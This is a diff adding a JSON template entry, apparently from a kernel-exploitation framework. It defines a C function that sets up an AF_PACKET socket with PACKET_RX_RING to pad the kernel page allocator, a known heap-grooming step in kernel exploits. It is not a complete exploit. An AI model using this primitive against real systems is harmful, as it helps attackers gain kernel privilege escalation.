@@ -1,0 +1,8 @@
+{
+  "allocator": "page",
+  "size": 0,
+  "varlen": true,
+  "define": "void do_pgv_padding() {\n    unsigned int block_size = %d;\n    unsigned int block_nr = %d;\n    unsigned int frame_size = 2048;\n    int t = syscall(__NR_socket, 0x11, 3, htobe16(3));\n    if (t < 0) {\n    \tfail(\"[-] socket(AF_PACKET)\");\n    }\n    uint8 content[28];\n    uint64 address = (uint64)&content;\n    *(uint32*)(address) = block_size;\n    *(uint32*)(address+4) = block_nr;\n    *(uint32*)(address+8) = 0x800;\n    *(uint32*)(address+12) = block_size * block_nr / 0x800;\n    *(uint32*)(address+16) = 0x64;\n    *(uint32*)(address+20) = 0;\n    *(uint32*)(address+24) = 0;\n    int rv = syscall(__NR_setsockopt, t, 0x107, 5, address, 0x1c);\n    if (rv < 0) {\n    \tfail(\"[-] setsockopt(PACKET_RX_RING)\");\n    }\n}\n\n",
+  "name": "do_pgv_padding",
+  "priority": 10
+}
